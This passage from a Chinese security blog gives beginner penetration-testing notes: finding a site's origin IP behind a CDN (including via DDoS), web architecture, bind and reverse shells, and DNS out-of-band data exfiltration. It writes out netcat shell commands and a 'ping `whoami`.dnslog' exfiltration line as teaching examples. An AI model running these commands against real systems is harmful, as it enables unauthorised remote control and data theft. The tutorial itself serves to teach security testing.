href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></li><li>w8 fuckcdn</li><li>zmap</li></ul></li></ol><h3 id="遗留文件"><a class="markdownIt-Anchor" href="#遗留文件"></a> 遗留文件</h3><ol><li><p><strong>原理</strong></p><p>一些站点在搭建之初，会用一些文件测试站点，例如“phpinfo()”文件，此类文件里就有可能包含了真实的IP地址。</p></li><li><p><strong>方法</strong></p><p>可以利用Google语法搜索站点是否有遗留文件，里面的 <code>SERVER-ADDR</code> 字段存在IP配置信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com inurl:phpinfo.php</span><br></pre></td></tr></table></figure></li></ol><h3 id="dns解析历史记录"><a class="markdownIt-Anchor" href="#dns解析历史记录"></a> DNS解析历史记录</h3><ol><li><p><strong>原理</strong>：站点在使用CDN服务之前，它的真实IP地址可能被DNS服务器所记录到，此时我们就可以通过DNS历史记录找到目标真实IP。</p></li><li><p><strong>方法</strong>：</p><p>1）获取DNS解析的历史记录可以获取真实IP</p><ul><li><a href="https://site.ip138.com/">https://site.ip138.com/</a></li><li><a href="https://x.threatbook.com/">https://x.threatbook.com/</a> 需要会员</li><li><a href="https://viewdns.info/">https://viewdns.info/</a> 在IP history模块查询</li><li><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li></ul></li></ol><h3 id="ddos攻击"><a class="markdownIt-Anchor" href="#ddos攻击"></a> DDOS攻击</h3><p>CDN作为负载均衡的工具，存在流量上限，当CDN的访问量达到流量上限的时候，我们再去访问网站访问的一般就是没有使用CDN的真实IP</p><h3 id="网络测绘引擎搜索特定内容"><a class="markdownIt-Anchor" href="#网络测绘引擎搜索特定内容"></a> 网络测绘引擎搜索特定内容</h3><ol><li><p><strong>原理</strong></p><p>通过关键字检索相关的ip或域名，很多时候能直接获取到网站的真实ip</p></li><li><p><strong>常用的网络测绘引擎</strong></p><ul><li>shodan：<a href="https://www.shodan.io/">https://www.shodan.io/</a></li><li>钟馗之眼：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></li><li>fofa：<a href="https://fofa.info/">https://fofa.info/</a></li></ul></li><li><p><strong>方法</strong></p><p><strong>1）对网站的icon进行检索</strong></p><p>查看网站源代码找到网站icon对应的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取favicon.ico</span></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://i0.hdslb.com/bfs/static/jinkela/long/images/favicon.ico&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将内容编码为base64</span></span><br><span class="line">favicon_base64 = base64.b64encode(response.content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算hash</span></span><br><span class="line">hash_value = mmh3.<span class="built_in">hash</span>(favicon_base64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;shodan语法：http.favicon.hash: &#x27;</span> + <span class="built_in">str</span>(hash_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;fofa语法：icon_hash=&quot;&#123;&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(hash_value)))</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>待进一步仔细阅读：<a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a></p><h3 id="利用主动漏洞"><a class="markdownIt-Anchor" href="#利用主动漏洞"></a> 利用主动漏洞</h3><p>如果网站存在主动请求自定义网址此类的主动漏洞，可以利用漏洞让目标请求我们所控制的服务器，从而获取到网站的真实IP</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/f12c127ac5f8011328571dc14d409d4f.png" alt="f12c127ac5f8011328571dc14d409d4f" /></p><h2 id="真实ip验证"><a class="markdownIt-Anchor" href="#真实ip验证"></a> 真实IP验证</h2><p>想要验证我们获取到的IP是否可信，可以采用下面的方法</p><ol><li><p><strong>第三方ip地址查询工具</strong>：不一定准确</p><ul><li><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></li></ul></li><li><p><strong>手动验证</strong></p><ul><li>查询网站IP的真实地址地址，在网站主页上找备案号看是否地区一致</li><li>检索网站公司相关信息，所在地等，结合社工进行验证</li></ul></li><li><p><strong>本地 DNS 劫持验证</strong></p><p>原理：</p><p>通过在本地修改 <code>hosts</code> 文件，将目标域名强制解析到你获取的 IP 地址，从而绕过正常的 DNS 解析流程。CDN 的一个核心功能是缓存内容，缓存需要时间同步和刷新。如果强制将域名解析到某个 IP 上，而这个 IP 是 CDN 节点，可能出现：</p><ul><li>内容可能不完整（因为CDN缓存和源站之间需要同步）。</li><li>某些动态请求可能出现异常（例如 API 数据未返回或功能失效）。</li><li>网址连接失败</li></ul><p>而源站直接处理请求，内容完整，刷新异常不会发生。</p><p>步骤：</p><p>1）清空本地 DNS 缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /flushdns       <span class="comment"># Windows</span></span><br><span class="line">sudo dscacheutil -flushcache           <span class="comment"># macOS</span></span><br></pre></td></tr></table></figure><p>2）修改hosts文件</p><p>修改 <code>C:\Windows\System32\drivers\etc</code> 文件中的ip域名映射，为我们获取的真实ip地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">175.12.114.176 mozhe.com</span><br><span class="line">175.12.114.176 www.mozhe.com</span><br></pre></td></tr></table></figure><p>3）访问网站</p><ul><li>如果网站功能和内容都正常，说明连接的可能是源站。</li><li>如果出现刷新异常、功能失效，或者内容不一致，则可能连接的是 CDN 节点。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web安全』web安全基础</title>
      <link href="/posts/9284.html"/>
      <url>/posts/9284.html</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试"><a class="markdownIt-Anchor" href="#渗透测试"></a> 渗透测试</h1><ol><li><p><strong>为什么探测域名真实IP很重要</strong></p><ul><li>以目录扫描为例，如果我们直接对域名进行扫描，那么就只能扫到网站源代码中该域名绑定的目录（一般是www）文件夹下的子文件。如果对该域名绑定的IP进行扫描，那么获取到的就是根目录上的文件，有的可能直接将网站源代码放在根目录上</li></ul><blockquote><p>一般根目录下一个文件夹绑定一个域名</p></blockquote></li></ol><p>本文主要对web安全常见的攻击面进行描述，主要包括：</p><ul><li>中间件</li><li>web源码</li><li>系统与数据库</li></ul><p>值得注意的是：除去常规web安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了web应用或其他安全问题。所以明确安全测试思路是很重要的!</p><h1 id="靶场"><a class="markdownIt-Anchor" href="#靶场"></a> 靶场</h1><p>综合：</p><ul><li>pikachu：初步理解漏洞</li></ul><p>框架漏洞：</p><ul><li><a href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></li></ul><h1 id="web架构"><a class="markdownIt-Anchor" href="#web架构"></a> web架构</h1><h2 id="常规服务搭建"><a class="markdownIt-Anchor" href="#常规服务搭建"></a> 常规服务搭建</h2><p>步骤：</p><ol><li>购买云服务器和域名</li><li>云服务器搭建中间件：如IIS、Nginx等</li><li>下载并上传网站源代码</li><li>添加网站并设置域名解析</li><li>启动和测试服务</li></ol><h2 id="集成软件搭建"><a class="markdownIt-Anchor" href="#集成软件搭建"></a> 集成软件搭建</h2><ol><li><p><strong>原理</strong></p><p>通过打包类集成化环境，自动化实现服务器的搭建和管理</p><p>宝塔面板、PhpStudy等</p></li><li><p><strong>不同的集成软件，安全性存在差异</strong></p><p>例如：默认情况下，phpstudy是允许目录访问、命令执行的，但是宝塔并不允许，这样攻击者攻入phpstudy搭建的网站时权限更高</p></li></ol><h2 id="docker容器"><a class="markdownIt-Anchor" href="#docker容器"></a> Docker容器</h2><ol><li><p><strong>原理</strong></p><p>采用虚拟化技术独立磁盘空间构建容器，只隔离应用程序的运行时环境但容器之间可以共享同一个操作系统，这里的运行时环境指的是程序运行依赖的各种库以及配置。解决了同一服务器上部署多个web应用需要的多种环境问题</p></li><li><p><strong>对安全测试的影响</strong></p><p>拿到网站权限后，访问网站目录我们可以发现访问的并不是真实目录，而是虚拟空间的目录，权限也并不是真实的权限</p><p>对抗技术：docker逃逸</p></li></ol><h2 id="站库分离"><a class="markdownIt-Anchor" href="#站库分离"></a> 站库分离</h2><ol><li><p><strong>什么是站库分离</strong></p><p>源码和数据库放在不同的内网服务器上，或者使用了公网数据库，如自建公网数据库、阿里云、华为云等云数据库产品。</p></li><li><p><strong>对安全测试造成的影响</strong></p><p>数据被单独存放，需要能够连接上才可以影响数据。这样看似提高了数据安全性，但是如果网站存在漏洞，攻击者还是有可能以Web或Data为入口访问到内网数据库服务器中的数据。</p></li><li><p><strong>站库分离渗透思路</strong></p><p><a href="https://www.cnblogs.com/lcxblogs/articles/14324173.html">站库分离渗透思路总结</a></p></li></ol><h2 id="前后端分离"><a class="markdownIt-Anchor" href="#前后端分离"></a> 前后端分离</h2><ol><li><p><strong>什么是前后端分离</strong></p><p>前端和后端完全独立，前后端通过HTTP接口（通常是JSON格式）进行数据交互。</p><ul><li>后端：仅提供API，负责数据和业务逻辑的处理</li><li>前端：专注于界面展示和用户交互，使用现代JavaScript框架处理复杂的UI逻辑</li></ul></li><li><p><strong>对安全测试造成的影响</strong></p><p>传统的web架构（如php开发）需要前后端一起部署，代码运行在同一环境中。</p><p>而前后端分离的架构可以<u>分别部署前端和后端</u>，前端代码可以托管在静态服务器或CDN上，后端独立运行服务。</p><ul><li>前端JS框架一般不会存在漏洞：JS语言特性决定</li><li>难以获取后端域名：一般问题都在后台，但是扫描不到，只能通过信息收集获取</li><li>获取权限可能不影响后端：即使在前端上传了后门，也可能不影响后端</li></ul></li></ol><h2 id="托管网站"><a class="markdownIt-Anchor" href="#托管网站"></a> 托管网站</h2><ol><li><p><strong>什么是托管网站</strong></p><p>有些公司只是想弄一个网站来打广告，做一个静态的页面展示，并不想要花比较高的成本去购买服务器。在这种情况下可能会找到<strong>网站托管平台</strong>，利用别人的服务器托管一个简单的网站，托管平台直接分配一个域名</p><p>例如：<a href="https://jz.fkw.com/">凡科建站</a></p></li><li><p><strong>对安全测试的影响</strong></p><p>我们对托管网站进行安全测试得到的资产并不是目标的资产，而是这个托管平台的资产，进行攻击并没有意义</p></li><li><p><strong>检测是否为托管网站</strong></p><p>查这个网站的公司，如果不是目标公司（例如，网站域名的所有者是凡科建站），就说明这个网站为托管网站</p></li></ol><h1 id="web开发"><a class="markdownIt-Anchor" href="#web开发"></a> web开发</h1><h2 id="开发模式"><a class="markdownIt-Anchor" href="#开发模式"></a> 开发模式</h2><ol><li><p><strong>最简单最入门的开发模型（功能代码全部手写）</strong></p><ul><li><p><strong>特点</strong>：开发者通过手写代码实现所有功能，没有使用任何框架或组件，完全依赖开发者的个人能力和经验。</p></li><li><p><strong>优点</strong>：灵活、简单，适合初学者或小型项目。</p></li><li><p><strong>缺点</strong>：容易出现漏洞，尤其是当开发者的能力不足时。由于缺乏第三方或团队的审核或检测，代码质量难以保障，可能埋下许多安全隐患。</p></li></ul></li><li><p><strong>结合开发框架的开发模型（以框架为核心实现功能）</strong></p><ul><li><p><strong>特点</strong>：开发者使用现成的框架来开发应用程序，框架提供了一些预先设计好的功能模块和机制，帮助开发者快速完成项目。</p></li><li><p><strong>优点</strong>：框架通常内置一些安全过滤机制，可以减少开发者处理安全问题的负担，提高开发效率。</p></li><li><p><strong>缺点</strong>：框架本身可能存在漏洞，如果这些漏洞被利用，整个应用程序都会受到影响。</p></li></ul></li><li><p><strong>结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）</strong></p><ul><li><p><strong>特点</strong>：在使用框架的基础上，还集成了额外的组件或库来扩展功能。组件可能是由第三方或团队开发的。</p></li><li><p><strong>优点</strong>：功能更强大，灵活性更高，能快速实现复杂需求。</p></li><li><p><strong>缺点</strong>：框架和组件都可能存在漏洞，尤其是在组件更新不及时或组件与框架之间不兼容的情况下，会进一步增加安全风险。</p></li></ul></li></ol><h2 id="源码目录结构"><a class="markdownIt-Anchor" href="#源码目录结构"></a> 源码目录结构</h2><ul><li><p><code>admin/</code>：网站后台</p></li><li><p><code>src/</code>：源代码文件</p></li><li><p><code>data/</code>：数据处理</p></li><li><p><code>static/</code>  或  <code>public/</code>：存储静态资源文件，如CSS、JavaScript、图片、字体等</p></li><li><p><code>templates/</code> 或 <code>views/</code>：存储HTML或其他类型的模板文件，用于与后端渲染引擎协作生成动态内容。</p></li><li><p><code>README.md</code> ：存储项目说明文档，包括如何安装、运行和贡献代码等信息。</p></li><li><p><code>LICENSE</code> ：项目的开源许可文件。</p></li><li><p><code>config/</code> 、<code>includes/</code> 或 <code>settings/</code> ：存储项目配置文件，包括数据库连接、应用环境变量等。</p></li><li><p><code>scripts/</code> ：存储自动化脚本，如构建、部署、数据迁移脚本</p></li></ul><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><ol><li></li></ol><h1 id="web基础概念"><a class="markdownIt-Anchor" href="#web基础概念"></a> Web基础概念</h1><h2 id="中间件"><a class="markdownIt-Anchor" href="#中间件"></a> 中间件</h2><ol><li><p><strong>什么是中间件</strong></p><p>中间件是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源。中间件位于客户机/ 服务器的操作系统之上，管理计算机资源和网络通讯。是连接两个独立应用程序或独立系统的软件。相连接的系统，即使它们具有不同的接口，但通过中间件相互之间仍能交换信息。执行中间件的一个关键途径是信息传递。通过中间件，应用程序可以工作于多平台或OS环境。</p></li><li><p><strong>中间件的分类</strong></p><p>中间件种类繁多，包括：Web中间件、数据库中间件、消息中间件、安全中间件、事务中间件、应用程序服务器中间件、分布式计算中间件等。</p><ul><li>Web服务器中间件：用于接收和处理HTTP请求的软件，提供Web服务。包括 <mark>Apcahe、Nginx、IIS、lighttpd</mark> 等</li><li>缓存中间件：通过缓存常用的数据和对象，减少了对后端系统的请求次数，从而提高了应用程序的响应时间和吞吐量。包括Redis、Apache Ignite等</li><li>应用服务器中间件：用于处理应用程序的业务逻辑的软件，它们通常用于Java EE和其他应用程序开发技术中。包括 <mark>Tomcat、Jboss、Weblogic、Websphere</mark> 等</li><li>安全中间件：保护应用程序和网络安全的软件，它们通常用于防止攻击、授权和身份验证、加密和解密数据等。包括TLS、WAF等</li></ul><blockquote><p>1）参考：<a href="https://blog.csdn.net/weixin_45840241/article/details/138271599">什么是中间件?中间件有哪些?</a></p><p><strong>2）web服务器和应用服务器有什么区别？</strong></p><ul><li><p>web服务器</p><ul><li><p>数据类型：处理静态数据（HTML文件、CSS、JS、图片等）。</p></li><li><p>工作模式</p><p>接收HTTP请求 -&gt; 从文件系统中查找资源 -&gt; 返回给客户端。</p></li><li><p>端口：一般与80、443端口有关</p></li></ul></li><li><p>应用服务器</p><ul><li><p>数据类型：处理动态数据（与数据库交互、业务逻辑计算）。</p></li><li><p>工作模式</p><p>接收请求 -&gt; 执行应用逻辑 -&gt; 生成动态响应内容（如HTML、JSON） -&gt; 返回给Web服务器。</p></li><li><p>端口：应用服务器都有自己独特的端口，例如Tomcat一般使用8080，Weblogic一般使用7001</p></li></ul></li></ul></blockquote></li><li><p><strong>中间件的影响</strong></p><p>中间件配置直接影响服务器行为，包括缓存、负载均衡、安全设置等，对Web应用的性能和安全性有重要影响。</p></li><li><p><strong>中间件识别</strong></p><ul><li>中间件识别：数据包头部的server字段</li><li>中间件漏洞利用：参考 <a href="https://vulhub.org/#/docs/">https://vulhub.org/#/docs/</a></li><li>中间件漏洞学习靶场：<a href="https://vulhub.org/#/environments/">https://vulhub.org/#/environments/</a><ul><li>安装使用教程：<a href="https://blog.csdn.net/xiangxue888/article/details/143696039">https://blog.csdn.net/xiangxue888/article/details/143696039</a></li><li>如果将靶场安装在虚拟机上面，想要在物理机上访问，所使用的ip为<code>ens33</code> 接口的 IP 地址，它是虚拟机在外部网络中的地址，可以用来与虚拟机进行通信。</li></ul></li></ul></li></ol><h2 id="第三方软件或服务"><a class="markdownIt-Anchor" href="#第三方软件或服务"></a> 第三方软件或服务</h2><ol><li><p><strong>什么是网站的第三方软件和服务</strong></p><p>网站的第三方软件和服务指的是由其他公司或开发者提供的工具、应用程序、或服务，这些工具可以集成到网站中，用于实现特定功能或提高效率。这些第三方服务通常通过API、插件、或嵌入式代码与网站交互。</p></li><li><p><strong>常见的第三方软件和服务类型</strong></p><ul><li>身份验证与安全<ul><li>功能：管理用户登录和增强安全性。</li><li>示例：Auth0、Google OAuth、reCAPTCHA。</li></ul></li><li>客服与聊天工具<ul><li>功能：与用户实时沟通。</li><li>示例：Zendesk、LiveChat、Intercom。</li></ul></li><li>云存储和CDN<ul><li>功能：提高内容加载速度和数据存储效率。</li><li>示例：AWS S3、Cloudflare、Google Cloud CDN。</li></ul></li></ul></li><li><p><strong>第三方软件或服务识别</strong></p><p>使用nmap进行服务扫描，version部分显示服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># nmap -O -sV IP</span><br><span class="line">nmap -O -sV 10.1.1.130</span><br></pre></td></tr></table></figure></li></ol><h2 id="路由访问"><a class="markdownIt-Anchor" href="#路由访问"></a> 路由访问</h2><p>现在有很多网站的路径并不是和网站源码目录对应，而是根据路由的配置决定。</p><p>在我们上传后门的时候，如果后门所在目录不在路由配置里面，可能无法访问</p><h2 id="正向代理和反向代理"><a class="markdownIt-Anchor" href="#正向代理和反向代理"></a> 正向代理和反向代理</h2><p>推荐看这篇文章，非常的通俗易懂：<a href="https://cloud.tencent.com/developer/article/1418457">终于有人把正向代理和反向代理解释的明明白白了！</a></p><ol><li><p><strong>差异</strong></p><p>正向代理服务器和反向代理服务器所处的位置都是客户端和真实服务器之间，所做的事情也都是把客户端的请求转发给服务器，再把服务器的响应转发给客户端，但是二者之间还是有一定的差异的：</p><ul><li>1）<strong>正向代理其实是客户端的代理</strong>，帮助客户端访问其无法访问的服务器资源。<strong>反向代理则是服务器的代理</strong>，帮助服务器做负载均衡，安全防护等。</li><li>2）<strong>正向代理一般是客户端架设的</strong>，比如在自己的机器上安装一个代理软件。而<strong>反向代理一般是服务器架设的</strong>，比如在自己的机器集群中部署一个反向代理服务器。</li><li>3）<strong>正向代理中，服务器不知道真正的客户端到底是谁</strong>，以为访问自己的就是真实的客户端。而在<strong>反向代理中，客户端不知道真正的服务器是谁</strong>，以为自己访问的就是真实的服务器。</li><li>4）正向代理和反向代理的作用和目的不同。<strong>正向代理主要是用来解决访问限制问题。而反向代理则是提供负载均衡、安全防护等作用。二者均能提高访问速度。</strong></li></ul></li><li><p><strong>对安全测试造成的影响</strong></p><p>访问目标只是一个代理，非真实应用服务器</p></li></ol><h2 id="oss对象存储服务"><a class="markdownIt-Anchor" href="#oss对象存储服务"></a> OSS对象存储服务</h2><ol><li><p><strong>原理</strong></p><p>OSS（Object Storage Service，对象存储服务）是一种基于对象存储技术的<strong>云存储服务</strong>，常用于存储和管理海量的非结构化数据，提高访问速度。OSS提供了高可用性、高扩展性和高可靠性的存储解决方案，适用于图片、视频、音频、备份数据、日志文件等多种类型的数据。</p></li><li><p><strong>为什么要使用第三方存储？</strong></p><ul><li>静态文件会占用大量服务器带宽</li><li>OSS加载速度快</li><li>占用大量服务器存储空间</li></ul></li><li><p><strong>对安全测试造成的影响</strong></p><ul><li>OSS存储只是单纯的储存数据资源，没有代码执行环境，即使上传了后门脚本，也无法解析，相对于直接上传到网站服务器上，更加安全。</li><li>带来了 <code>Accesskey</code> 的隐患： 可能造成Accesskey的泄露，攻击者可以登录OSS</li></ul></li></ol><h2 id="负载均衡"><a class="markdownIt-Anchor" href="#负载均衡"></a> 负载均衡</h2><ol><li><strong>原理</strong></li></ol><p>大型网站都要面对庞大的用户量，高并发，海量数据等挑战，可以采用负载均衡来提升系统整体的性能。将同一应用部署到多台机器上，将用户访问请求，通过某种算法，分发到集群中的节点进行处理，并返回相应数据。</p><ol start="2"><li><p><strong>对安全测试造成的影响</strong></p><p>有多个服务器加载服务，测试过程中存在多个目标情况</p></li></ol><h1 id="渗透测试基本概念"><a class="markdownIt-Anchor" href="#渗透测试基本概念"></a> 渗透测试基本概念</h1><h2 id="正反向连接和正反向shell"><a class="markdownIt-Anchor" href="#正反向连接和正反向shell"></a> 正（反）向连接和正（反）向shell</h2><ol><li><p><strong>正向连接（Forward Connection）</strong>：</p><p>正向连接是一种常见的网络通信模式，其中客户端主动发起连接到服务器或目标系统。正向连接通常用于客户端-服务器通信，客户端主动请求服务或资源，例如网页浏览、电子邮件发送和接收等。在正向连接中，客户端充当主动方，向服务器发起连接请求，然后服务器接受并处理请求。</p></li><li><p><strong>正向shell</strong></p><p>正向 shell 通常使用正向连接来建立与目标系统的连接。在正向 shell 攻击中，攻击者的控制服务器充当客户端，主动连接到目标受害者服务器，建立正向连接。一旦连接建立，攻击者可以远程执行命令，访问目标系统并控制它。</p><ul><li><p>linux控制windows</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害者服务器将cmd绑定到待连接端口</span></span><br><span class="line">nc -e cmd -lvp 5566</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击者的控制服务器主动连接目标端口</span></span><br><span class="line">ncat 47.122.23.131 5566</span><br></pre></td></tr></table></figure></li><li><p>windows控制linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 受害者服务器将sh绑定到待连接端口</span><br><span class="line">nc -e /bin/sh -lvp 5566</span><br><span class="line"></span><br><span class="line"># 攻击者的控制服务器主动连接目标端口</span><br><span class="line">ncat 47.122.23.131 5566</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>注意：windows下是没有nc的，需要先下载nc.exe，如果目标服务器是windows可以先通过rce进行下载</p></blockquote></li><li><p><strong>反向连接（Reverse Connection）</strong></p><p>反向连接是一种网络通信模式，其中目标系统主动建立与控制系统或服务器的连接。反向连接通常用于合法的远程管理和控制，例如远程桌面会话、SSH远程管理等。在反向连接中，目标系统充当客户端，主动连接到远程服务器或控制服务器，以接受命令并将结果返回。</p></li></ol><h3 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h3><ol><li><p><strong>概念</strong></p><p>反弹 shell  通常使用反向连接来建立与目标系统的连接。攻击者在目标系统上执行恶意代码，该代码使目标系统成为客户端，主动连接到攻击者的控制服务器，建立反向连接。一旦连接建立，攻击者可以远程执行命令，访问目标系统并控制它。</p><blockquote><p>参考：<a href="https://blog.csdn.net/weixin_44288604/article/details/111740527">反弹shell汇总，看我一篇就够了</a></p></blockquote></li><li><p><strong>在安全测试中的使用场景</strong></p><ul><li>存在漏洞但是并不回显，导致我们不知道RCE命令是否执行，可以建立反弹shell</li><li>防火墙存在入站策略，未设置出站策略</li></ul></li><li><p><strong>方法</strong></p><p>快速生成反弹shell命令：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p><p>一般使用NC(ncat)瑞士军刀：linux系统下自带，windows下需要下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nc -lvp 攻击机监听的端口</span></span><br><span class="line">攻击者：nc -lvp 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># nc -e /bin/sh 攻击机IP 攻击机监听的端口</span></span><br><span class="line">受害者：nc -e /bin/sh 192.168.239.128 4444</span><br></pre></td></tr></table></figure></li><li><p><strong>在不同场景下的实例</strong></p><p><strong>1）目标服务器在内网环境下，攻击机在外网</strong></p><p>目标服务器存在内网IP和外网IP（其实是路由器的公网IP，内网中的多个机器共用这个路由器的公网IP）。如果建立正向shell，连接走到内网的路由器上就不能继续找到内网的目标服务器了，这个时候就需要建立反向shell。</p><p><strong>2）如果攻击机和目标服务器都在内网环境下</strong></p><p>待补充，找一个跳板</p></li></ol><h2 id="带外查询"><a class="markdownIt-Anchor" href="#带外查询"></a> 带外查询</h2><p>当开启防火墙的入站和出站策略后，数据不回显。</p><p>参考：<a href="https://blog.csdn.net/weixin_48083470/article/details/119379081">DNSlog 带外查询</a></p><ul><li><p>linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将whoami执行后回显的信息通过dnslog带出来</span></span><br><span class="line">ping `<span class="built_in">whoami</span>`.vpod5d.dnslog.cn</span><br></pre></td></tr></table></figure></li><li><p>windows</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cmd不能使用反引号运算符，所以使用powershell的变量存储信息</span></span><br><span class="line"><span class="comment"># 结果中带有&#x27;\&#x27;所以导致ping命令无法执行</span></span><br><span class="line">powershell <span class="variable">$x</span>=<span class="built_in">whoami</span>;<span class="variable">$x</span>=<span class="variable">$x</span>.Replace(<span class="string">&#x27;\&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);<span class="variable">$y</span>=<span class="string">&#x27;.vpod5d.dnslog.cn&#x27;</span>;<span class="variable">$z</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;ping <span class="variable">$z</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><p><strong>为什么开启防火墙后 whoami数据还是可以带外回显？</strong></p><p>ping命令走的ICMP协议，而防火墙禁用端口是控制TCP/UDP协议，也就是控制传输层，</p><p>但是ICMP是网络层，是传输层下层，不受防火墙影响。所以可以使用ping命令将数据带出。</p></blockquote><h1 id="渗透测试中的常用命令"><a class="markdownIt-Anchor" href="#渗透测试中的常用命令"></a> 渗透测试中的常用命令</h1><p><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">web安全入门篇-渗透测试中常用的命令</a></p><h2 id="文件上传下载"><a class="markdownIt-Anchor" href="#文件上传下载"></a> 文件上传下载</h2><p>主要用于解决<strong>无图形化数据传输</strong>的问题</p><p>可以使用该工具进行快速生成文件下载命令：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Linux：wget curl python ruby perl java等</span><br><span class="line">- Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32等</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『注入攻击』Injection</title>
      <link href="/posts/a395.html"/>
      <url>/posts/a395.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><ol><li><p><strong>原理</strong></p><p>注入攻击的本质是把用户输入的数据当作代码执行，它有三个关键条件：</p><ul><li><p>用户能够控制输入</p></li><li><p>原本程序要执行的代码，拼接了用户输入的数据</p></li><li><p>变量不存在过滤或者过滤不严谨</p></li></ul></li><li><p><strong>靶场</strong></p><ul><li>sqli-lab</li><li></li></ul></li></ol><h1 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h1><p>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p><p>在这一模块我们将介绍如何检测网站中是否存在SQL注入漏洞</p><h2 id="盲注"><a class="markdownIt-Anchor" href="#盲注"></a> 盲注</h2><ol><li><p><strong>概念</strong></p><p>如果服务器开启了错误回显，可能会披露一些敏感信息以更正确的构造SQL注入语句。</p><ul><li><p><strong>盲注（blind injection）：在没有开启错误回显的情况下来进行的注入攻击</strong>。</p></li><li><p>缺少了回显的调试信息，攻击者必须找到一个方法来验证注入的SQL是否成功执行</p></li></ul></li><li><p><strong>方法</strong></p><p>1）<strong>最常见的盲注：构造简单的条件语句，根据返回页面是否发生变化，来判断SQL语句是否得到执行。</strong></p><p>假设页面URL：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 